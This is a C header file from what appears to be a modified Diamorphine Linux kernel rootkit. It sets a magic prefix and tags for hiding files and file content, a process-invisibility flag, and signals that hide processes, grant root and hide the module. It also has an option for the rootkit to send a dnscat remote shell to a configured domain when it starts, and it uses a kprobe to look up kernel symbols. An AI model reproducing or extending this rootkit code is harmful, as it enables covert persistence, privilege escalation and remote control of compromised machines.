struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define SSIZE_MAX 32767
#define MAGIC_PREFIX "new_diamorphine"
#define RK_PATH "/home/ad_astra/new_diamorphine/" 
#define HIDETAGIN "<viajano>"
#define HIDETAGOUT "</viajano>"
#define PF_INVISIBLE 0x10000000
#define DNSCATSHELL 1 // only if you want the RK to send a dnscat shell when initiated 
char *domain = "example.com"; // only if you want the RK to send a dnscat shell when initiated 
int file_check(void *arg, ssize_t size);
int hide_content(void *arg, ssize_t size);
atomic_t read_on;
#define MODULE_NAME "diamorphine"
enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#endif
